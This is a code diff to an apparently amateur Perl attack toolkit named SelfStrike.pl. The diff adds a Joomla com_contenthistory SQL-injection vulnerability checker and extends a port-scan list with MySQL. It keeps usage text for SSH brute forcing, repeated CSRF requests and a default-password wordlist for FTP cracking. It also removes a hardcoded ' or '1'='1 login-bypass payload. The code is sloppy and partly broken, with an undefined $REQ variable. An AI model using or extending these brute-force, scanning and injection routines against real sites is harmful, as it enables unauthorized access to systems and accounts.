@@ -37,12 +37,14 @@ SelfStrike.pl
  -t|type BruteForce-ssh -user 'admin' -pass 'wordlist.txt' -u 'site' *Brute Force in SSH*
  \n
  -t|type SelfStrike-CSRF -re|request 'q=1&s=1' -m|method 'GET|POST' -n|number '25' *Cross Site Request Fogery*
-	--- -qq 'name','pass' --qqr 'admin' '123'
+	--- -m POST -re name=>'admin',password=>'123',auth=>'000'
  \n
  -t|type SelfStrike-Ip -i|ip '192.168.0.c' -p|port '80' -timeout 5 -s|save 'output.txt'  *Search IP*
 	--- -ip 00 *random IPs*
  \n
  -t|type SelfStrike-Url -u|url 'deffy0h.tk' *Get Info WebSite*
+ \n
+ -t|type SelfStrike-Joomla -u|url 'deffy0h.tk' *Joomla Vulnerability*
  \n\n\n
 ";
 
@@ -52,8 +54,8 @@ my $developer="
 
 ";
 
-my @port_	 =("20","21","22","80","23","25","53","443","465","1080","1194","1433","25565");
-my @port_type=("FTP","FTP","SSH","HTTP","TELNET","SMTP","DOMAIN","HTTPS","SMTP","SOCKS","OPEN_VPN","SQL","MINECRAFT");
+my @port_	 =("20","21","22","80","23","25","53","443","465","1080","1194","1433","3306","25565");
+my @port_type=("FTP","FTP","SSH","HTTP","TELNET","SMTP","DOMAIN","HTTPS","SMTP","SOCKS","OPEN_VPN","SQL","MYSQL","MINECRAFT");
 
 my @ftp 	=("admin","root","","anonymous","-anonymous@","administrator","123456","12345","12345678","qwerty","password","1234567890","1234","baseball","dragon","football","1234567","monkey","letmein","abc123","111111","mustang","access","shadow","master","michael","superman","696969","123123","batman","trustno1","iloveyou","adobe123","azerty","Admin","letmein","photoshop","shadow","sunshine","password1");
 
@@ -105,8 +107,6 @@ my $user="";
 my $pass="";
 my $save="";
 my $number=0;
-my @pp="";
-my @qqr="";
 
 
 GetOptions(
@@ -123,8 +123,6 @@ GetOptions(
 	"pass=s"=>\$pass,
 	"s|save=s"=>\$save,
 	"n|number=i"=>\$number,
-	"qq=s@"=>\@qq,
-	"qqr=s@"=>\@qqr
 
 );
 
@@ -158,6 +156,51 @@ if($type eq "BruteForce-ssh"    || $type eq "bruteforce-ssh"){
 }
 if($type eq "SelfStrike-CSRF"    || $type eq "selfstrike-csrf"){
 &SelfStrike_CSRF
+}
+if($type eq "SelfStrike-Joomla"    || $type eq "selfstrike-joomla"){
+&SelfStrike_Joomla
+}
+
+sub SelfStrike_Joomla(){
+unless($url){
+print "\ntyping a DNS|URL -u 'site'\n";
+print $modeuser;
+exit;
+}
+
+if($url!~m/http:/){
+$url="http://$url";
+}
+
+my $herro="An error has occurred while processing your request.";
+my $hse="SELECT|select";
+my $hose="ORDER|order";
+my @hjoomla=("/index.php?option=com_contenthistory&view=history&list[select]=1","/index.php?option=com_contenthistory&view=history&list[ordering]=1");
+
+my $hh=0;
+
+while($hh<2){
+
+my $rg=$url.@hjoomla[$hh];
+
+print "[+] conection to $rg\n";
+
+$ua = LWP::UserAgent->new;
+if($re=HTTP::Request->new(GET=>$rg)){
+$response=$ua->request($re);
+if($response->status_line==$OK_HTTP){
+my $htm=$response->decoded_content;
+if($htm=~$herro || $htm=~$hse || $htm=~$hose){
+print "[+] $url have vulnerability in Joomla Plung-ing\n\n";
+}else{
+print "[-] $url no have vulnerability in Joomla Plung-ing\n\n";
+}
+}else{
+print "[-] FAIL\n\n";
+}
+}
+$hh++;
+}
 }
 
 #4Er45
@@ -207,12 +250,9 @@ $c++;
 #@2POST
 my $c=0;
 while($c<$number){
-foreach my $req(@qq){
-#print $req;
-}
 print "[+] connecting to POST:$url:80 counter($c)\n";
 $ua = LWP::UserAgent->new;
-if($re=HTTP::Request->new(POST=>$url,[password=>"' or '1'='1"])){
+if($re=HTTP::Request->new(POST=>$url,[$REQ])){
 $response=$ua->request($re);
 if($response->status_line==$OK_HTTP){
 print "[+] SUCCESS\n\n";
